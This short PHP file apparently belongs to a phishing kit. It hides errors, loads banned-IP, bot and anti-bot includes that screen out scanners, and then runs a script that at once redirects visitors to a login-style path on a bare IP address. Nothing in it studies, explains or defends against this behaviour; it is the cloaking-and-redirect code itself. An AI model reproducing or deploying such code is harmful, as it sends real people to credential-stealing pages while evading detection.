<?php
error_reporting(0);
session_start();
include ('./inclu/banned-ip.php');
include ('./inclu/bots.php');
include ('./inclu/antibots.php');
?>
<script>setTimeout(function(){window.location.href='http://217.61.96.101/LoginMDPopmZyL21vbnByb2/LoginMDPopmZyL21vbnByb2/LoginMDPopmZyL21vbnByb2/LoginMDPopmZyL21vbnByb2/'},0);</script>


